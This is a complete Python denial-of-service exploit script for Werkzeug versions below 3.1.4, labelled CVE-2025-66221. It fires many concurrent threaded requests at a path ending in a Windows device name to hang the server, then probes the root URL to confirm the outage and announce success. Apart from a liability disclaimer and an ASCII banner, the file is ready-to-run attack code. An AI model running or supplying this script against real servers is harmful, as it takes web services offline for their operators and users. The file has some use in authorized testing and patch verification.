# Disclaimer
# This script is provided solely for controlled security testing and research purposes. It must only be used on systems and environments for which you have explicit, written authorization. Any use outside of legally sanctioned testing — including against third-party, public, or production systems — is strictly prohibited and may violate local and international laws. You assume full responsibility for all actions taken with this tool. The author accepts no liability for misuse, damages, service disruption, or legal consequences arising from unauthorized activity.

from requests import get, exceptions
from threading import Lock, Thread
from time import time, sleep
from argparse import ArgumentParser
from sys import exit as ex

parser = ArgumentParser()
parser.add_argument("-u", "--url", type=str, required=True)
parser.add_argument("-d", "--directory", type=str, required=True)
parser.add_argument("-t", "--threads", type=int, required=True)
parser.add_argument("-p", "--payload", type=str, required=True)
parser.add_argument("--timeout", type=int, required=True)

args = parser.parse_args()

TARGET_URL = args.url
TARGET_DIR = args.directory
NUM_THREADS = args.threads   # The number of concurrent requests to send. 
PAYLOAD = args.payload     # The Windows device name used to trigger the hang    
EXPLOIT_URL = f"{TARGET_URL}/{TARGET_DIR}/{PAYLOAD}"
REQUEST_TIMEOUT = args.timeout # Timeout for each client request
BANNER = r"""                                              
                                                             
██     ██ ▄▄▄▄▄ ▄▄▄▄  ▄▄ ▄▄  ▄████  ▄▄ ▄▄  ▄▄▄   ▄▄▄▄ ▄▄▄▄▄▄ 
██ ▄█▄ ██ ██▄▄  ██▄█▄ ██▄█▀ ██  ▄▄▄ ██▄██ ██▀██ ███▄▄   ██   
 ▀██▀██▀  ██▄▄▄ ██ ██ ██ ██  ▀███▀  ██ ██ ▀███▀ ▄▄██▀   ██   
                                                             
Exploit for Werkzeug < 3.1.4 (CVE-2025-66221)
Github/LinkedIn: JawadPy 
"""

success_count = 0
fail_count = 0
lock = Lock()

def make_sure():
    try:
        get(TARGET_URL)
    except exceptions.ReadTimeout:
        return True
    except KeyboardInterrupt:
        print('Good bye..')
        ex()
    return False

def exploit():
    """Function run by each thread to send a request that causes a hang."""
    global success_count, fail_count
    
    try:
        get(EXPLOIT_URL, timeout=REQUEST_TIMEOUT)
        
        with lock:
            fail_count += 1        
    except exceptions.ReadTimeout:
        with lock:
            if make_sure():
                success_count += 1
            else:
                fail_count += 1
    except exceptions.ConnectionError as e:
        with lock:
            fail_count += 1        
    except Exception as e:
         with lock:
            fail_count += 1
    except KeyboardInterrupt:
        print('Good bye..')
        ex()

def main():
    threads = []
    start_time = time()

    print(BANNER, f'\n[*] Target URL: {EXPLOIT_URL}\n[*] Number of concurrent threads: {NUM_THREADS}')
    try:
        for i in range(1, NUM_THREADS + 1):
            t = Thread(target=exploit)
            threads.append(t)
            t.start()
            sleep(0.05) 

        for t in threads:
            t.join()

        end_time = time()
        print(f"""
[!] DoS Attack finished.
[!] Total time elapsed: {end_time - start_time:.2f} seconds
    """
        )
    except KeyboardInterrupt:
        print('Good bye..')
        ex()

    if success_count > 0:
        print('[*] Success.')
    else:
        print("[*] The server appears unexploitable, perhaps you need to increase --threads.")

if __name__ == '__main__':

    main()
